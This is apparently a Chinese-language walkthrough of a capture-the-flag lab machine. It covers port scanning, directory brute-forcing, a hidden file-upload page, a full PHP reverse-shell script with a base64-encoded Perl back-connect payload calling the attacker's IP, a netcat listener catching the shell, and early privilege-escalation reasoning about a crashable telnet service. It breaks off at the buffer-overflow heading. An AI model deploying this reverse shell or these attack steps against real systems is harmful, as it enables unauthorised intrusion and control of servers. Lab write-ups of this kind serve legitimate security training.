```
└─# nmap -p- -sV -A 192.168.0.102
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 de:b5:23:89:bb:9f:d4:1a:b5:04:53:d0:b7:5c:b0:3f (RSA)
|   256 16:09:14:ea:b9:fa:17:e9:45:39:5e:3b:b4:fd:11:0a (ECDSA)
|_  256 9f:66:5e:71:b9:12:5d:ed:70:5a:4f:5a:8d:0d:65:d5 (ED25519)
23/tcp open  telnet?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, ms-sql-s, oracle-tns, tn3270: 
|_    Verification Code:
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-title: 404 Not Found
|_Requested resource was login.php
```

### 对80端口：

```
└─# gobuster dir -u http://192.168.0.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak  
└─# nikto -host 192.168.0.102 
```

#### SQL注入：

好像啥也没有，就一登录框，试试sql注入，万能密码啥的

<img src=".\图片\Snipaste_2022-12-04_15-07-15.png" alt="Snipaste_2022-12-04_15-07-15" style="zoom:80%;" />

<img src=".\图片\Snipaste_2022-12-04_15-09-56.png" alt="Snipaste_2022-12-04_15-09-56" style="zoom: 67%;" />

接下来我们是优先找该系统有无cms有无已知漏洞，再手工看看功能点有无漏洞，然后提取该系统的重要信息，如账号密码啥的，然而我发现这里只是简单的课程管理crud，好像无法利用，于是看看url，再对子目录进行爆破

```
└─# gobuster dir -u http://192.168.0.102/student_attendance -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak  
```

```
/index.php            (Status: 302) [Size: 14619] [--> login.php]
/.php                 (Status: 403) [Size: 278]
/home.php             (Status: 200) [Size: 2985]
/login.php            (Status: 200) [Size: 4765]
/article.txt          (Status: 200) [Size: 0]
/header.php           (Status: 200) [Size: 2548]
/users.php            (Status: 200) [Size: 5206]
/assets               (Status: 301) [Size: 334] [--> http://192.168.0.102/student_attendance/assets/]
/faculty.php          (Status: 200) [Size: 3688]
/courses.php          (Status: 200) [Size: 5444]
/ajax.php             (Status: 200) [Size: 0]
/students.php         (Status: 200) [Size: 3152]
/database             (Status: 301) [Size: 336] [--> http://192.168.0.102/student_attendance/database/]
/readme.txt           (Status: 200) [Size: 0]
/class.php            (Status: 200) [Size: 4764]
/navbar.php           (Status: 200) [Size: 1948]
/subjects.php         (Status: 200) [Size: 4956]
/topbar.php           (Status: 200) [Size: 1284]
```

#### 文件上传：

有收获，但不多。再看看管理主页的源码信息吧，发现了这个玩意儿  index.php?page=site_settings

```
<div class="sidebar-list">
			................
			........
				<!-- <a href="index.php?page=site_settings" class="nav-item nav-site_settings"><span class='icon-field'><i class="fa fa-cogs text-danger"></i></span> System Settings</a> -->
					</div>
```

<img src=".\图片\Snipaste_2022-12-04_16-10-25.png" alt="Snipaste_2022-12-04_16-10-25" style="zoom:60%;" />

这里有文件上传功能，其实再回顾思考一下，我们找到了uploads目录，可是原来管理主页无文件上传功能，这时候得细心了

，可能我们未找到文件上传功能而已。找一个前期收集到的php反弹shell的脚本

```
<?php
function which($pr) {
	$path = execute("which $pr");
	return ($path ? $path : $pr);
	}
function execute($cfe) {
	$res = '';
	if ($cfe) {
		if(function_exists('exec')) {
			@exec($cfe,$res);
			$res = join("\n",$res);
			} 
			elseif(function_exists('shell_exec')) {
			$res = @shell_exec($cfe);
			} elseif(function_exists('system')) {
@ob_start();
@system($cfe);
$res = @ob_get_contents();
@ob_end_clean();
} elseif(function_exists('passthru')) {
@ob_start();
@passthru($cfe);
$res = @ob_get_contents();
@ob_end_clean();
} elseif(@is_resource($f = @popen($cfe,"r"))) {
$res = '';
while(!@feof($f)) {
$res .= @fread($f,1024);
}
@pclose($f);
}
}
return $res;
}
function cf($fname,$text){
if($fp=@fopen($fname,'w')) {
@fputs($fp,@base64_decode($text));
@fclose($fp);
}
}
$yourip = "192.168.0.103";
$yourport = '4444';
$usedb = array('perl'=>'perl','c'=>'c');
$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
cf('/tmp/.bc',$back_connect);
$res = execute(which('perl')." /tmp/.bc $yourip $yourport &");
?> 
```

```
┌──(root💀kali)-[~]
└─# nc -lvvp 4444            
listening on [any] 4444 ...
connect to [192.168.0.103] from 192.168.0.102 [192.168.0.102] 37974
Linux school 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@school:/var/www/html/student_attendance/assets/uploads$ 
```

### 提权：

```
www-data@school:/home/ppp$ ps -aux
root       524  0.0  0.5 2631308 5948 ?        S    06:59   0:00 /opt/access/access.exe
```

linux下.exe都出来了,看看

```
-rw-r--r-- 1 root root 51019 Nov  7  2020 access.exe
```

我们再看看root目录，发现可以进入，看看win

```
www-data@school:/opt/access$ cd /root
cd /root
www-data@school:/root$ ls -al
ls -al
total 36
drwxr-xr-x  4 root root 4096 Nov  7  2020 .
drwxr-xr-x 18 root root 4096 Dec  2 16:23 ..
lrwxrwxrwx  1 root root    9 Nov  7  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Oct 27  2020 .ssh
-rw-------  1 root root  764 Nov  7  2020 .viminfo
drwxr-xr-x  4 root root 4096 Dec  4  2022 .wine
-rw-------  1 root root   33 Nov  7  2020 proof.txt
-rwxr-xr-x  1 root root   61 Nov  3  2020 win
www-data@school:/root$ cat win
cat win
while true
 do
  wine /opt/access/access.exe
  sleep 3
 done
```

#### 关于23端口telnet：

在这里我们要思考一下，因为root身份死循环调用了/opt/access/access.exe，我们可能只需要修改access.exe的内容调用bash之类的，就可能提权到root了

我们再停一停，还记得之前的23端口telnet开放着吗

```
└─# telnet 192.168.0.102 23      
Trying 192.168.0.102...
Connected to 192.168.0.102.
Escape character is '^]'.
Verification Code:
�@�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa......(溢出)
```

```
──(root💀kali)-[~]
└─# telnet 192.168.0.102 23                                                                                                                                1 ⨯
Trying 192.168.0.102...
telnet: Unable to connect to remote host: Connection refused
```

发现直接把telnet干崩了，可能存在缓冲区溢出，然后隔一会再试试telnet 192.168.0.102 23

```
                                                                                                                                                               
┌──(root💀kali)-[~]
└─# telnet 192.168.0.102 23                                                                                                                                1 ⨯
Trying 192.168.0.102...
Connected to 192.168.0.102.
Escape character is '^]'.
Verification Code:
�@�sssss
Connection closed by foreign host.
```

可以猜测，肯能 /opt/access/access.exe 就是重启telnet服务的吧，假如我们在缓冲区溢出的位置插入恶意payload，这个恶意payload是被root调用的，那么此时便提权到root了

#### 缓冲区溢出：
